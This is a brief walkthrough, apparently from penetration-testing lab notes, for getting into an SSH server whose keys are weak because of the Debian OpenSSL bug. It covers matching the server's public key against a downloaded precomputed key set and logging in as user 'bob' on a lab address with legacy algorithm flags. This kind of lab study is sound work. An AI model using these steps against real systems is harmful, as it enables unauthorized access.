1. First go to your /etc/ssh/ssh_config and add the following (check 1st 7 chars of public key):`PubkeyAcceptedKeyTypes +ssh-dss`
2. Go to PublicKeyMatch folder(downloaded, https://github.com/g0tmi1k/debian-ssh).
3. First copy the first 40+ characters of the public key after the 1st 7 characters, then go to each and every folder (for eg 1024) and search manually using:`grep -lr ‘AAAAB3NzaC................................’`
4. Once you found the public key folder, use the following command to connect (without pub):`ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-dss bob@10.11.1.136 -vv`
5. Check the oKexAlgorithms by matching to your nmap enumeration and change if required if cannot work. HostKeyAlgorithm use the first 7 chars.
